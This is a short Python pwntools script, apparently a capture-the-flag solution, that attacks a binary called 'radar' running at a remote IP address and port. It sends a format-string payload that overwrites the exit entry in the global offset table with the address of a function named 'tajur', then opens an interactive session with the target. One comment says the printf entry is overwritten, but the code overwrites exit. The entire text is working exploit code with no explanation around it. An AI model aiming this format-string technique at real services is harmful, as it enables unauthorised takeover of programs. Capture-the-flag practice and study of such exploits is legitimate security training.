from pwn import *

elf = context.binary = ELF('./radar')
context.log_level = 'DEBUG'
# p = process(elf.path)
p = remote('103.185.44.122', 27429)

# Adjust the offset based on your binary
offset = 6


# Construct the payload to overwrite printf GOT with the address of tajur function
payload = fmtstr_payload(offset, {elf.got['exit']: elf.sym['tajur']})

# Send the payload
p.sendlineafter(b">> ", payload)
p.interactive()
